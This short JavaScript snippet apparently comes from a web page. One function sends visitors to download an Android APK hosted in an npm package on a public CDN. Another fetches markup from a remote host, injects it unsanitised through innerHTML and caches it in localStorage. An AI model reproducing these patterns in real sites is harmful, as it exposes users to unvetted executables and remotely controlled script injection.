

function dc()
{ 

 window.location.assign("https://cdn.jsdelivr.net/npm/arcio@1.0.2/fnaka.apk")
 }
 
 function  checkCookie(){
         k=localStorage.getItem("mk");
          if  (k==null){
a=$.get("https://ejir.js.org/vefu/m.xml");
a.done(function(){
var  b=a.responseText;
let m=document.getElementById("p1");
 m.innerHTML=b;
 window.localStorage.setItem("mk",b);
 
})}
else {
let kch=document.getElementById("p1");
 kch.innerHTML=k;


 }}
